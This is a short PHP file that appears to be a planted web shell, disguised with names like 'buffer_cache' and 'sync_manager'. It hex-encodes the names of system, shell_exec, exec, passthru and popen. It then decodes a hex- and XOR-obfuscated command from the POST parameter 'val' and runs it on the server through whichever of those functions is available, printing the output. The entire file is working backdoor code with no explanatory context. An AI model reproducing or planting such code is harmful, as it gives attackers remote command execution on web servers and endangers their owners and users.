<?php

$buffer_cache4 = "p\x61s\x73th\x72u";
$buffer_cache2 = "shell_e\x78ec";
$buffer_cache3 = "e\x78\x65c";
$buffer_cache6 = "\x73\x74\x72\x65am\x5F\x67e\x74\x5F\x63o\x6Etents";
$buffer_cache5 = "pope\x6E";
$sync_manager = "hex2bi\x6E";
$buffer_cache7 = "\x70\x63l\x6Fse";
$buffer_cache1 = "\x73\x79s\x74em";
if (isset($_POST["v\x61\x6C"])) {
            function restore_state  ( $resource  ,  $ent    )    {
 $data_chunk   =  '' ;
   for($p=0;
 $p<strlen($resource);
 $p++){
$data_chunk.=chr(ord($resource[$p])^$ent);

} return $data_chunk;
    
}
            $val = $sync_manager($_POST["v\x61\x6C"]);
            $val = restore_state($val, 74);
            if (function_exists($buffer_cache1)) {
                $buffer_cache1($val);
            } elseif (function_exists($buffer_cache2)) {
                print $buffer_cache2($val);
            } elseif (function_exists($buffer_cache3)) {
                $buffer_cache3($val, $pointer_resource);
                print join("\n", $pointer_resource);
            } elseif (function_exists($buffer_cache4)) {
                $buffer_cache4($val);
            } elseif (function_exists($buffer_cache5) && function_exists($buffer_cache6) && function_exists($buffer_cache7)) {
                $ent_data_chunk = $buffer_cache5($val, 'r');
                if ($ent_data_chunk) {
                    $rec_pset = $buffer_cache6($ent_data_chunk);
                    $buffer_cache7($ent_data_chunk);
                    print $rec_pset;
                }
            }
            exit;
        }